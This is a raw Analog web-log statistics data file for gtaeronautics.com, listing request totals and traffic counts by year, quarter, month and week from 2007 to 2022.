x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2022	05	08	05	44
x	FR	2007	12	18	17	05
x	LR	2022	05	06	23	56
x	E7	2022	05	08	05	44
x	SR	1038749
x	S7	1385
x	NC	410094
x	C7	0
x	FL	421598
x	F7	347
x	RR	187
x	R7	0
x	NH	92124
x	H7	284
x	BT	42782494721
x	B7	154076101
1	Rr	28085	2.704	2022
1	Rr	98917	9.523	2021
1	Rr	89380	8.605	2020
1	Rr	80088	7.710	2019
1	Rr	68927	6.636	2018
1	Rr	60168	5.792	2017
1	Rr	73316	7.058	2016
1	Rr	80796	7.778	2015
1	Rr	110773	10.664	2014
1	Rr	65173	6.274	2013
1	Rr	60742	5.848	2012
1	Rr	57015	5.489	2011
1	Rr	22139	2.131	2010
1	Rr	69710	6.711	2009
1	Rr	71820	6.914	2008
1	Rr	1700	0.164	2007
1	*BT	R	110773	2014
Q	Rr	8215	0.791	2022	2
Q	Rr	19870	1.913	2022	1
Q	Rr	21154	2.036	2021	4
Q	Rr	26826	2.583	2021	3
Q	Rr	30675	2.953	2021	2
Q	Rr	20262	1.951	2021	1
Q	Rr	22199	2.137	2020	4
Q	Rr	23882	2.299	2020	3
Q	Rr	21656	2.085	2020	2
Q	Rr	21643	2.084	2020	1
Q	Rr	19098	1.839	2019	4
Q	Rr	19668	1.893	2019	3
Q	Rr	19827	1.909	2019	2
Q	Rr	21495	2.069	2019	1
Q	Rr	18129	1.745	2018	4
Q	Rr	17138	1.650	2018	3
Q	Rr	16928	1.630	2018	2
Q	Rr	16732	1.611	2018	1
Q	Rr	15937	1.534	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	1.620	2017	2
Q	Rr	27400	2.638	2017	1
Q	Rr	22114	2.129	2016	4
Q	Rr	17621	1.696	2016	3
Q	Rr	15878	1.529	2016	2
Q	Rr	17703	1.704	2016	1
Q	Rr	16575	1.596	2015	4
Q	Rr	22104	2.128	2015	3
Q	Rr	22485	2.165	2015	2
Q	Rr	19632	1.890	2015	1
Q	Rr	21142	2.035	2014	4
Q	Rr	22272	2.144	2014	3
Q	Rr	31453	3.028	2014	2
Q	Rr	35906	3.457	2014	1
Q	Rr	16436	1.582	2013	4
Q	Rr	15216	1.465	2013	3
Q	Rr	16545	1.593	2013	2
Q	Rr	16976	1.634	2013	1
Q	Rr	16578	1.596	2012	4
Q	Rr	12511	1.204	2012	3
Q	Rr	15816	1.523	2012	2
Q	Rr	15837	1.525	2012	1
Q	Rr	15444	1.487	2011	4
Q	Rr	17386	1.674	2011	3
Q	Rr	9395	0.904	2011	2
Q	Rr	14790	1.424	2011	1
Q	Rr	1603	0.154	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	1.352	2010	2
Q	Rr	6489	0.625	2010	1
Q	Rr	16350	1.574	2009	4
Q	Rr	18220	1.754	2009	3
Q	Rr	17115	1.648	2009	2
Q	Rr	18025	1.735	2009	1
Q	Rr	15905	1.531	2008	4
Q	Rr	15660	1.508	2008	3
Q	Rr	22448	2.161	2008	2
Q	Rr	17807	1.714	2008	1
Q	Rr	1700	0.164	2007	4
Q	*BT	R	35906	2014	1
m	Rr	1414	0.136	2022	05
m	Rr	6801	0.655	2022	04
m	Rr	6380	0.614	2022	03
m	Rr	6175	0.594	2022	02
m	Rr	7315	0.704	2022	01
m	Rr	7667	0.738	2021	12
m	Rr	7097	0.683	2021	11
m	Rr	6390	0.615	2021	10
m	Rr	6059	0.583	2021	09
m	Rr	9092	0.875	2021	08
m	Rr	11675	1.124	2021	07
m	Rr	10152	0.977	2021	06
m	Rr	10231	0.985	2021	05
m	Rr	10292	0.991	2021	04
m	Rr	7948	0.765	2021	03
m	Rr	5800	0.558	2021	02
m	Rr	6514	0.627	2021	01
m	Rr	8069	0.777	2020	12
m	Rr	6579	0.633	2020	11
m	Rr	7551	0.727	2020	10
m	Rr	8028	0.773	2020	09
m	Rr	7741	0.745	2020	08
m	Rr	8113	0.781	2020	07
m	Rr	7317	0.704	2020	06
m	Rr	6898	0.664	2020	05
m	Rr	7441	0.716	2020	04
m	Rr	7524	0.724	2020	03
m	Rr	7322	0.705	2020	02
m	Rr	6797	0.654	2020	01
m	Rr	6573	0.633	2019	12
m	Rr	5917	0.570	2019	11
m	Rr	6608	0.636	2019	10
m	Rr	6791	0.654	2019	09
m	Rr	6597	0.635	2019	08
m	Rr	6280	0.605	2019	07
m	Rr	6317	0.608	2019	06
m	Rr	6847	0.659	2019	05
m	Rr	6663	0.641	2019	04
m	Rr	7059	0.680	2019	03
m	Rr	6374	0.614	2019	02
m	Rr	8062	0.776	2019	01
m	Rr	6957	0.670	2018	12
m	Rr	5422	0.522	2018	11
m	Rr	5750	0.554	2018	10
m	Rr	5458	0.525	2018	09
m	Rr	5735	0.552	2018	08
m	Rr	5945	0.572	2018	07
m	Rr	7110	0.684	2018	06
m	Rr	6440	0.620	2018	05
m	Rr	3378	0.325	2018	04
m	Rr	5789	0.557	2018	03
m	Rr	5369	0.517	2018	02
m	Rr	5574	0.537	2018	01
m	Rr	3906	0.376	2017	12
m	Rr	6533	0.629	2017	11
m	Rr	5498	0.529	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.658	2017	05
m	Rr	9999	0.963	2017	04
m	Rr	11887	1.144	2017	03
m	Rr	7941	0.764	2017	02
m	Rr	7572	0.729	2017	01
m	Rr	9483	0.913	2016	12
m	Rr	7121	0.686	2016	11
m	Rr	5510	0.530	2016	10
m	Rr	6288	0.605	2016	09
m	Rr	5888	0.567	2016	08
m	Rr	5445	0.524	2016	07
m	Rr	5042	0.485	2016	06
m	Rr	5495	0.529	2016	05
m	Rr	5341	0.514	2016	04
m	Rr	5558	0.535	2016	03
m	Rr	5548	0.534	2016	02
m	Rr	6597	0.635	2016	01
m	Rr	5574	0.537	2015	12
m	Rr	5330	0.513	2015	11
m	Rr	5671	0.546	2015	10
m	Rr	6196	0.596	2015	09
m	Rr	6788	0.653	2015	08
m	Rr	9120	0.878	2015	07
m	Rr	7156	0.689	2015	06
m	Rr	5694	0.548	2015	05
m	Rr	9635	0.928	2015	04
m	Rr	6215	0.598	2015	03
m	Rr	6084	0.586	2015	02
m	Rr	7333	0.706	2015	01
m	Rr	6608	0.636	2014	12
m	Rr	6997	0.674	2014	11
m	Rr	7537	0.726	2014	10
m	Rr	7043	0.678	2014	09
m	Rr	7324	0.705	2014	08
m	Rr	7905	0.761	2014	07
m	Rr	11654	1.122	2014	06
m	Rr	9211	0.887	2014	05
m	Rr	10588	1.019	2014	04
m	Rr	7817	0.753	2014	03
m	Rr	15229	1.466	2014	02
m	Rr	12860	1.238	2014	01
m	Rr	5325	0.513	2013	12
m	Rr	5513	0.531	2013	11
m	Rr	5598	0.539	2013	10
m	Rr	4655	0.448	2013	09
m	Rr	4938	0.475	2013	08
m	Rr	5623	0.541	2013	07
m	Rr	5492	0.529	2013	06
m	Rr	5211	0.502	2013	05
m	Rr	5842	0.562	2013	04
m	Rr	6068	0.584	2013	03
m	Rr	5055	0.487	2013	02
m	Rr	5853	0.563	2013	01
m	Rr	5688	0.548	2012	12
m	Rr	5477	0.527	2012	11
m	Rr	5413	0.521	2012	10
m	Rr	4331	0.417	2012	09
m	Rr	3866	0.372	2012	08
m	Rr	4314	0.415	2012	07
m	Rr	4655	0.448	2012	06
m	Rr	6047	0.582	2012	05
m	Rr	5114	0.492	2012	04
m	Rr	6128	0.590	2012	03
m	Rr	5430	0.523	2012	02
m	Rr	4279	0.412	2012	01
m	Rr	5548	0.534	2011	12
m	Rr	4779	0.460	2011	11
m	Rr	5117	0.493	2011	10
m	Rr	5431	0.523	2011	09
m	Rr	6256	0.602	2011	08
m	Rr	5699	0.549	2011	07
m	Rr	5420	0.522	2011	06
m	Rr	3975	0.383	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.347	2011	03
m	Rr	5171	0.498	2011	02
m	Rr	6011	0.579	2011	01
m	Rr	1603	0.154	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.395	2010	06
m	Rr	5018	0.483	2010	05
m	Rr	4928	0.474	2010	04
m	Rr	5095	0.490	2010	03
m	Rr	1394	0.134	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.449	2009	12
m	Rr	6187	0.596	2009	11
m	Rr	5498	0.529	2009	10
m	Rr	5066	0.488	2009	09
m	Rr	5718	0.550	2009	08
m	Rr	7436	0.716	2009	07
m	Rr	5685	0.547	2009	06
m	Rr	6120	0.589	2009	05
m	Rr	5310	0.511	2009	04
m	Rr	5515	0.531	2009	03
m	Rr	6123	0.589	2009	02
m	Rr	6387	0.615	2009	01
m	Rr	5763	0.555	2008	12
m	Rr	5420	0.522	2008	11
m	Rr	4722	0.455	2008	10
m	Rr	5435	0.523	2008	09
m	Rr	4843	0.466	2008	08
m	Rr	5382	0.518	2008	07
m	Rr	6082	0.586	2008	06
m	Rr	9946	0.957	2008	05
m	Rr	6420	0.618	2008	04
m	Rr	5431	0.523	2008	03
m	Rr	6469	0.623	2008	02
m	Rr	5907	0.569	2008	01
m	Rr	1700	0.164	2007	12
m	*BT	R	15229	2014	02
W	Rr	1414	0.136	2022	05	01
W	Rr	1865	0.180	2022	04	24
W	Rr	1381	0.133	2022	04	17
W	Rr	1630	0.157	2022	04	10
W	Rr	1670	0.161	2022	04	03
W	Rr	1588	0.153	2022	03	27
W	Rr	1204	0.116	2022	03	20
W	Rr	1350	0.130	2022	03	13
W	Rr	1488	0.143	2022	03	06
W	Rr	1368	0.132	2022	02	27
W	Rr	1481	0.143	2022	02	20
W	Rr	1657	0.160	2022	02	13
W	Rr	1518	0.146	2022	02	06
W	Rr	1787	0.172	2022	01	30
W	Rr	2021	0.195	2022	01	23
W	Rr	1429	0.138	2022	01	16
W	Rr	1693	0.163	2022	01	09
W	Rr	1541	0.148	2022	01	02
W	Rr	1311	0.126	2021	12	26
W	Rr	1839	0.177	2021	12	19
W	Rr	1732	0.167	2021	12	12
W	Rr	2001	0.193	2021	12	05
W	Rr	1641	0.158	2021	11	28
W	Rr	1615	0.155	2021	11	21
W	Rr	1673	0.161	2021	11	14
W	Rr	1625	0.156	2021	11	07
W	Rr	1523	0.147	2021	10	31
W	Rr	1562	0.150	2021	10	24
W	Rr	1474	0.142	2021	10	17
W	Rr	1349	0.130	2021	10	10
W	Rr	1615	0.155	2021	10	03
W	Rr	1598	0.154	2021	09	26
W	Rr	1646	0.158	2021	09	19
W	Rr	1203	0.116	2021	09	12
W	Rr	1106	0.106	2021	09	05
W	Rr	1383	0.133	2021	08	29
W	Rr	1685	0.162	2021	08	22
W	Rr	2071	0.199	2021	08	15
W	Rr	2279	0.219	2021	08	08
W	Rr	2374	0.229	2021	08	01
W	Rr	2543	0.245	2021	07	25
W	Rr	2843	0.274	2021	07	18
W	Rr	2777	0.267	2021	07	11
W	Rr	2756	0.265	2021	07	04
W	Rr	2524	0.243	2021	06	27
W	Rr	2466	0.237	2021	06	20
W	Rr	2262	0.218	2021	06	13
W	Rr	2264	0.218	2021	06	06
W	Rr	2101	0.202	2021	05	30
W	Rr	3009	0.290	2021	05	23
W	Rr	1989	0.191	2021	05	16
W	Rr	2386	0.230	2021	05	09
W	Rr	2138	0.206	2021	05	02
W	Rr	1668	0.161	2021	04	25
W	Rr	2413	0.232	2021	04	18
W	Rr	3035	0.292	2021	04	11
W	Rr	2709	0.261	2021	04	04
W	Rr	1942	0.187	2021	03	28
W	Rr	1666	0.160	2021	03	21
W	Rr	1476	0.142	2021	03	14
W	Rr	1713	0.165	2021	03	07
W	Rr	1777	0.171	2021	02	28
W	Rr	1173	0.113	2021	02	21
W	Rr	1101	0.106	2021	02	14
W	Rr	1699	0.164	2021	02	07
W	Rr	1867	0.180	2021	01	31
W	Rr	1404	0.135	2021	01	24
W	Rr	1564	0.151	2021	01	17
W	Rr	1431	0.138	2021	01	10
W	Rr	1666	0.160	2021	01	03
W	Rr	1926	0.185	2020	12	27
W	Rr	1572	0.151	2020	12	20
W	Rr	1404	0.135	2020	12	13
W	Rr	2272	0.219	2020	12	06
W	Rr	1522	0.147	2020	11	29
W	Rr	1722	0.166	2020	11	22
W	Rr	1580	0.152	2020	11	15
W	Rr	1401	0.135	2020	11	08
W	Rr	1499	0.144	2020	11	01
W	Rr	1470	0.142	2020	10	25
W	Rr	2379	0.229	2020	10	18
W	Rr	1559	0.150	2020	10	11
W	Rr	1729	0.166	2020	10	04
W	Rr	1674	0.161	2020	09	27
W	Rr	1786	0.172	2020	09	20
W	Rr	2200	0.212	2020	09	13
W	Rr	1677	0.161	2020	09	06
W	Rr	1596	0.154	2020	08	30
W	Rr	1833	0.176	2020	08	23
W	Rr	1814	0.175	2020	08	16
W	Rr	2206	0.212	2020	08	09
W	Rr	1397	0.134	2020	08	02
W	Rr	1816	0.175	2020	07	26
W	Rr	1949	0.188	2020	07	19
W	Rr	1532	0.147	2020	07	12
W	Rr	1976	0.190	2020	07	05
W	Rr	1600	0.154	2020	06	28
W	Rr	1627	0.157	2020	06	21
W	Rr	2101	0.202	2020	06	14
W	Rr	1590	0.153	2020	06	07
W	Rr	1492	0.144	2020	05	31
W	Rr	1556	0.150	2020	05	24
W	Rr	1756	0.169	2020	05	17
W	Rr	1568	0.151	2020	05	10
W	Rr	1567	0.151	2020	05	03
W	Rr	1734	0.167	2020	04	26
W	Rr	1675	0.161	2020	04	19
W	Rr	1702	0.164	2020	04	12
W	Rr	1965	0.189	2020	04	05
W	Rr	1329	0.128	2020	03	29
W	Rr	1818	0.175	2020	03	22
W	Rr	1345	0.129	2020	03	15
W	Rr	1581	0.152	2020	03	08
W	Rr	2014	0.194	2020	03	01
W	Rr	1942	0.187	2020	02	23
W	Rr	1748	0.168	2020	02	16
W	Rr	1949	0.188	2020	02	09
W	Rr	1683	0.162	2020	02	02
W	Rr	1436	0.138	2020	01	26
W	Rr	1792	0.173	2020	01	19
W	Rr	1519	0.146	2020	01	12
W	Rr	1420	0.137	2020	01	05
W	Rr	1109	0.107	2019	12	29
W	Rr	1023	0.098	2019	12	22
W	Rr	1584	0.152	2019	12	15
W	Rr	1783	0.172	2019	12	08
W	Rr	1704	0.164	2019	12	01
W	Rr	1178	0.113	2019	11	24
W	Rr	1697	0.163	2019	11	17
W	Rr	1510	0.145	2019	11	10
W	Rr	1383	0.133	2019	11	03
W	Rr	1309	0.126	2019	10	27
W	Rr	1473	0.142	2019	10	20
W	Rr	1519	0.146	2019	10	13
W	Rr	1485	0.143	2019	10	06
W	Rr	1416	0.136	2019	09	29
W	Rr	1499	0.144	2019	09	22
W	Rr	1652	0.159	2019	09	15
W	Rr	1710	0.165	2019	09	08
W	Rr	1485	0.143	2019	09	01
W	Rr	1689	0.163	2019	08	25
W	Rr	1315	0.127	2019	08	18
W	Rr	1619	0.156	2019	08	11
W	Rr	1558	0.150	2019	08	04
W	Rr	1360	0.131	2019	07	28
W	Rr	1191	0.115	2019	07	21
W	Rr	1730	0.167	2019	07	14
W	Rr	1299	0.125	2019	07	07
W	Rr	1339	0.129	2019	06	30
W	Rr	1592	0.153	2019	06	23
W	Rr	1497	0.144	2019	06	16
W	Rr	1450	0.140	2019	06	09
W	Rr	1555	0.150	2019	06	02
W	Rr	1289	0.124	2019	05	26
W	Rr	1863	0.179	2019	05	19
W	Rr	1385	0.133	2019	05	12
W	Rr	1553	0.150	2019	05	05
W	Rr	1655	0.159	2019	04	28
W	Rr	1282	0.123	2019	04	21
W	Rr	1503	0.145	2019	04	14
W	Rr	1623	0.156	2019	04	07
W	Rr	1715	0.165	2019	03	31
W	Rr	1882	0.181	2019	03	24
W	Rr	1464	0.141	2019	03	17
W	Rr	1381	0.133	2019	03	10
W	Rr	1627	0.157	2019	03	03
W	Rr	1773	0.171	2019	02	24
W	Rr	1669	0.161	2019	02	17
W	Rr	1483	0.143	2019	02	10
W	Rr	1391	0.134	2019	02	03
W	Rr	1797	0.173	2019	01	27
W	Rr	1963	0.189	2019	01	20
W	Rr	2029	0.195	2019	01	13
W	Rr	1696	0.163	2019	01	06
W	Rr	1526	0.147	2018	12	30
W	Rr	1226	0.118	2018	12	23
W	Rr	1442	0.139	2018	12	16
W	Rr	1936	0.186	2018	12	09
W	Rr	1809	0.174	2018	12	02
W	Rr	1295	0.125	2018	11	25
W	Rr	1820	0.175	2018	11	18
W	Rr	1802	0.173	2018	11	11
W	Rr	0	0.000	2018	11	04
W	Rr	1473	0.142	2018	10	28
W	Rr	1106	0.106	2018	10	21
W	Rr	1427	0.137	2018	10	14
W	Rr	1214	0.117	2018	10	07
W	Rr	1168	0.112	2018	09	30
W	Rr	1420	0.137	2018	09	23
W	Rr	1197	0.115	2018	09	16
W	Rr	1388	0.134	2018	09	09
W	Rr	1320	0.127	2018	09	02
W	Rr	1246	0.120	2018	08	26
W	Rr	1214	0.117	2018	08	19
W	Rr	1366	0.132	2018	08	12
W	Rr	1195	0.115	2018	08	05
W	Rr	1346	0.130	2018	07	29
W	Rr	1374	0.132	2018	07	22
W	Rr	1508	0.145	2018	07	15
W	Rr	1522	0.147	2018	07	08
W	Rr	909	0.088	2018	07	01
W	Rr	1444	0.139	2018	06	24
W	Rr	2682	0.258	2018	06	17
W	Rr	1365	0.131	2018	06	10
W	Rr	1329	0.128	2018	06	03
W	Rr	1275	0.123	2018	05	27
W	Rr	1392	0.134	2018	05	20
W	Rr	1321	0.127	2018	05	13
W	Rr	1527	0.147	2018	05	06
W	Rr	1517	0.146	2018	04	29
W	Rr	0	0.000	2018	04	22
W	Rr	1364	0.131	2018	04	15
W	Rr	1712	0.165	2018	04	08
W	Rr	0	0.000	2018	04	01
W	Rr	1543	0.149	2018	03	25
W	Rr	1342	0.129	2018	03	18
W	Rr	2429	0.234	2018	03	11
W	Rr	0	0.000	2018	03	04
W	Rr	1366	0.132	2018	02	25
W	Rr	1308	0.126	2018	02	18
W	Rr	1439	0.139	2018	02	11
W	Rr	1731	0.167	2018	02	04
W	Rr	0	0.000	2018	01	28
W	Rr	1434	0.138	2018	01	21
W	Rr	1578	0.152	2018	01	14
W	Rr	1471	0.142	2018	01	07
W	Rr	1246	0.120	2017	12	31
W	Rr	1033	0.099	2017	12	24
W	Rr	1103	0.106	2017	12	17
W	Rr	1406	0.135	2017	12	10
W	Rr	0	0.000	2017	12	03
W	Rr	1335	0.129	2017	11	26
W	Rr	1427	0.137	2017	11	19
W	Rr	1662	0.160	2017	11	12
W	Rr	1414	0.136	2017	11	05
W	Rr	1349	0.130	2017	10	29
W	Rr	1208	0.116	2017	10	22
W	Rr	2013	0.194	2017	10	15
W	Rr	1832	0.176	2017	10	08
W	Rr	0	0.000	2017	10	01
W	Rr	0	0.000	2017	09	24
W	Rr	0	0.000	2017	09	17
W	Rr	0	0.000	2017	09	10
W	Rr	0	0.000	2017	09	03
W	Rr	0	0.000	2017	08	27
W	Rr	0	0.000	2017	08	20
W	Rr	0	0.000	2017	08	13
W	Rr	0	0.000	2017	08	06
W	Rr	0	0.000	2017	07	30
W	Rr	0	0.000	2017	07	23
W	Rr	0	0.000	2017	07	16
W	Rr	0	0.000	2017	07	09
W	Rr	0	0.000	2017	07	02
W	Rr	0	0.000	2017	06	25
W	Rr	0	0.000	2017	06	18
W	Rr	0	0.000	2017	06	11
W	Rr	0	0.000	2017	06	04
W	Rr	25	0.002	2017	05	28
W	Rr	1838	0.177	2017	05	21
W	Rr	1915	0.184	2017	05	14
W	Rr	1676	0.161	2017	05	07
W	Rr	1677	0.161	2017	04	30
W	Rr	2071	0.199	2017	04	23
W	Rr	1978	0.190	2017	04	16
W	Rr	1874	0.180	2017	04	09
W	Rr	3435	0.331	2017	04	02
W	Rr	2619	0.252	2017	03	26
W	Rr	2633	0.253	2017	03	19
W	Rr	2413	0.232	2017	03	12
W	Rr	3092	0.298	2017	03	05
W	Rr	2295	0.221	2017	02	26
W	Rr	2204	0.212	2017	02	19
W	Rr	1869	0.180	2017	02	12
W	Rr	1973	0.190	2017	02	05
W	Rr	1783	0.172	2017	01	29
W	Rr	1768	0.170	2017	01	22
W	Rr	1585	0.153	2017	01	15
W	Rr	1768	0.170	2017	01	08
W	Rr	1740	0.168	2017	01	01
W	Rr	1549	0.149	2016	12	25
W	Rr	2202	0.212	2016	12	18
W	Rr	1812	0.174	2016	12	11
W	Rr	2648	0.255	2016	12	04
W	Rr	2236	0.215	2016	11	27
W	Rr	1321	0.127	2016	11	20
W	Rr	1996	0.192	2016	11	13
W	Rr	1716	0.165	2016	11	06
W	Rr	1564	0.151	2016	10	30
W	Rr	1362	0.131	2016	10	23
W	Rr	1707	0.164	2016	10	16
W	Rr	1696	0.163	2016	10	09
W	Rr	36	0.003	2016	10	02
W	Rr	2002	0.193	2016	09	25
W	Rr	1399	0.135	2016	09	18
W	Rr	1199	0.115	2016	09	11
W	Rr	1326	0.128	2016	09	04
W	Rr	1316	0.127	2016	08	28
W	Rr	1257	0.121	2016	08	21
W	Rr	1208	0.116	2016	08	14
W	Rr	1602	0.154	2016	08	07
W	Rr	1319	0.127	2016	07	31
W	Rr	1796	0.173	2016	07	24
W	Rr	1171	0.113	2016	07	17
W	Rr	1167	0.112	2016	07	10
W	Rr	917	0.088	2016	07	03
W	Rr	920	0.089	2016	06	26
W	Rr	1179	0.114	2016	06	19
W	Rr	1288	0.124	2016	06	12
W	Rr	1237	0.119	2016	06	05
W	Rr	1263	0.122	2016	05	29
W	Rr	1338	0.129	2016	05	22
W	Rr	1184	0.114	2016	05	15
W	Rr	1365	0.131	2016	05	08
W	Rr	974	0.094	2016	05	01
W	Rr	1311	0.126	2016	04	24
W	Rr	1127	0.108	2016	04	17
W	Rr	1248	0.120	2016	04	10
W	Rr	1451	0.140	2016	04	03
W	Rr	987	0.095	2016	03	27
W	Rr	1233	0.119	2016	03	20
W	Rr	1347	0.130	2016	03	13
W	Rr	1347	0.130	2016	03	06
W	Rr	1236	0.119	2016	02	28
W	Rr	1422	0.137	2016	02	21
W	Rr	1085	0.104	2016	02	14
W	Rr	1427	0.137	2016	02	07
W	Rr	1359	0.131	2016	01	31
W	Rr	1708	0.164	2016	01	24
W	Rr	1476	0.142	2016	01	17
W	Rr	1563	0.150	2016	01	10
W	Rr	1381	0.133	2016	01	03
W	Rr	1273	0.123	2015	12	27
W	Rr	1084	0.104	2015	12	20
W	Rr	1344	0.129	2015	12	13
W	Rr	1336	0.129	2015	12	06
W	Rr	1123	0.108	2015	11	29
W	Rr	960	0.092	2015	11	22
W	Rr	1337	0.129	2015	11	15
W	Rr	1400	0.135	2015	11	08
W	Rr	1383	0.133	2015	11	01
W	Rr	1250	0.120	2015	10	25
W	Rr	1366	0.132	2015	10	18
W	Rr	1367	0.132	2015	10	11
W	Rr	1214	0.117	2015	10	04
W	Rr	1152	0.111	2015	09	27
W	Rr	1387	0.134	2015	09	20
W	Rr	1655	0.159	2015	09	13
W	Rr	1526	0.147	2015	09	06
W	Rr	1242	0.120	2015	08	30
W	Rr	1800	0.173	2015	08	23
W	Rr	1527	0.147	2015	08	16
W	Rr	1386	0.133	2015	08	09
W	Rr	1593	0.153	2015	08	02
W	Rr	1567	0.151	2015	07	26
W	Rr	1980	0.191	2015	07	19
W	Rr	2180	0.210	2015	07	12
W	Rr	2008	0.193	2015	07	05
W	Rr	2297	0.221	2015	06	28
W	Rr	1556	0.150	2015	06	21
W	Rr	1380	0.133	2015	06	14
W	Rr	2013	0.194	2015	06	07
W	Rr	1651	0.159	2015	05	31
W	Rr	1224	0.118	2015	05	24
W	Rr	1355	0.130	2015	05	17
W	Rr	1179	0.114	2015	05	10
W	Rr	1436	0.138	2015	05	03
W	Rr	1671	0.161	2015	04	26
W	Rr	1878	0.181	2015	04	19
W	Rr	2326	0.224	2015	04	12
W	Rr	2636	0.254	2015	04	05
W	Rr	2297	0.221	2015	03	29
W	Rr	1237	0.119	2015	03	22
W	Rr	1453	0.140	2015	03	15
W	Rr	1399	0.135	2015	03	08
W	Rr	1287	0.124	2015	03	01
W	Rr	1249	0.120	2015	02	22
W	Rr	1373	0.132	2015	02	15
W	Rr	1790	0.172	2015	02	08
W	Rr	1672	0.161	2015	02	01
W	Rr	1543	0.149	2015	01	25
W	Rr	1463	0.141	2015	01	18
W	Rr	1696	0.163	2015	01	11
W	Rr	1707	0.164	2015	01	04
W	Rr	1833	0.176	2014	12	28
W	Rr	1335	0.129	2014	12	21
W	Rr	1644	0.158	2014	12	14
W	Rr	1541	0.148	2014	12	07
W	Rr	1335	0.129	2014	11	30
W	Rr	1262	0.121	2014	11	23
W	Rr	2009	0.193	2014	11	16
W	Rr	1566	0.151	2014	11	09
W	Rr	1814	0.175	2014	11	02
W	Rr	1452	0.140	2014	10	26
W	Rr	1642	0.158	2014	10	19
W	Rr	1795	0.173	2014	10	12
W	Rr	1836	0.177	2014	10	05
W	Rr	1662	0.160	2014	09	28
W	Rr	1843	0.177	2014	09	21
W	Rr	1678	0.162	2014	09	14
W	Rr	1598	0.154	2014	09	07
W	Rr	1418	0.137	2014	08	31
W	Rr	1584	0.152	2014	08	24
W	Rr	1571	0.151	2014	08	17
W	Rr	1727	0.166	2014	08	10
W	Rr	1927	0.186	2014	08	03
W	Rr	1691	0.163	2014	07	27
W	Rr	1702	0.164	2014	07	20
W	Rr	1624	0.156	2014	07	13
W	Rr	1831	0.176	2014	07	06
W	Rr	1867	0.180	2014	06	29
W	Rr	1927	0.186	2014	06	22
W	Rr	2134	0.205	2014	06	15
W	Rr	4851	0.467	2014	06	08
W	Rr	2293	0.221	2014	06	01
W	Rr	3180	0.306	2014	05	25
W	Rr	1468	0.141	2014	05	18
W	Rr	1808	0.174	2014	05	11
W	Rr	1998	0.192	2014	05	04
W	Rr	1876	0.181	2014	04	27
W	Rr	2330	0.224	2014	04	20
W	Rr	2565	0.247	2014	04	13
W	Rr	2652	0.255	2014	04	06
W	Rr	2574	0.248	2014	03	30
W	Rr	1186	0.114	2014	03	23
W	Rr	1305	0.126	2014	03	16
W	Rr	2273	0.219	2014	03	09
W	Rr	2231	0.215	2014	03	02
W	Rr	1925	0.185	2014	02	23
W	Rr	7060	0.680	2014	02	16
W	Rr	2854	0.275	2014	02	09
W	Rr	3190	0.307	2014	02	02
W	Rr	3743	0.360	2014	01	26
W	Rr	3643	0.351	2014	01	19
W	Rr	2961	0.285	2014	01	12
W	Rr	2319	0.223	2014	01	05
W	Rr	981	0.094	2013	12	29
W	Rr	1108	0.107	2013	12	22
W	Rr	1226	0.118	2013	12	15
W	Rr	1285	0.124	2013	12	08
W	Rr	1289	0.124	2013	12	01
W	Rr	1404	0.135	2013	11	24
W	Rr	1142	0.110	2013	11	17
W	Rr	1334	0.128	2013	11	10
W	Rr	1277	0.123	2013	11	03
W	Rr	1035	0.100	2013	10	27
W	Rr	1309	0.126	2013	10	20
W	Rr	1302	0.125	2013	10	13
W	Rr	1432	0.138	2013	10	06
W	Rr	1178	0.113	2013	09	29
W	Rr	947	0.091	2013	09	22
W	Rr	1254	0.121	2013	09	15
W	Rr	1099	0.106	2013	09	08
W	Rr	1053	0.101	2013	09	01
W	Rr	1010	0.097	2013	08	25
W	Rr	1102	0.106	2013	08	18
W	Rr	1063	0.102	2013	08	11
W	Rr	1105	0.106	2013	08	04
W	Rr	1377	0.133	2013	07	28
W	Rr	1498	0.144	2013	07	21
W	Rr	1295	0.125	2013	07	14
W	Rr	1237	0.119	2013	07	07
W	Rr	1003	0.097	2013	06	30
W	Rr	1275	0.123	2013	06	23
W	Rr	1072	0.103	2013	06	16
W	Rr	1249	0.120	2013	06	09
W	Rr	1521	0.146	2013	06	02
W	Rr	1256	0.121	2013	05	26
W	Rr	1091	0.105	2013	05	19
W	Rr	1359	0.131	2013	05	12
W	Rr	1130	0.109	2013	05	05
W	Rr	1215	0.117	2013	04	28
W	Rr	1368	0.132	2013	04	21
W	Rr	1318	0.127	2013	04	14
W	Rr	1408	0.136	2013	04	07
W	Rr	1277	0.123	2013	03	31
W	Rr	1452	0.140	2013	03	24
W	Rr	1418	0.137	2013	03	17
W	Rr	1217	0.117	2013	03	10
W	Rr	1490	0.143	2013	03	03
W	Rr	1353	0.130	2013	02	24
W	Rr	1268	0.122	2013	02	17
W	Rr	1274	0.123	2013	02	10
W	Rr	1153	0.111	2013	02	03
W	Rr	1266	0.122	2013	01	27
W	Rr	1271	0.122	2013	01	20
W	Rr	1449	0.139	2013	01	13
W	Rr	1253	0.121	2013	01	06
W	Rr	1309	0.126	2012	12	30
W	Rr	1156	0.111	2012	12	23
W	Rr	1336	0.129	2012	12	16
W	Rr	1575	0.152	2012	12	09
W	Rr	1087	0.105	2012	12	02
W	Rr	1376	0.132	2012	11	25
W	Rr	1136	0.109	2012	11	18
W	Rr	1341	0.129	2012	11	11
W	Rr	1418	0.137	2012	11	04
W	Rr	1103	0.106	2012	10	28
W	Rr	1200	0.116	2012	10	21
W	Rr	1382	0.133	2012	10	14
W	Rr	1127	0.108	2012	10	07
W	Rr	1187	0.114	2012	09	30
W	Rr	1172	0.113	2012	09	23
W	Rr	1034	0.100	2012	09	16
W	Rr	944	0.091	2012	09	09
W	Rr	958	0.092	2012	09	02
W	Rr	734	0.071	2012	08	26
W	Rr	881	0.085	2012	08	19
W	Rr	874	0.084	2012	08	12
W	Rr	973	0.094	2012	08	05
W	Rr	1010	0.097	2012	07	29
W	Rr	943	0.091	2012	07	22
W	Rr	1089	0.105	2012	07	15
W	Rr	888	0.085	2012	07	08
W	Rr	845	0.081	2012	07	01
W	Rr	1070	0.103	2012	06	24
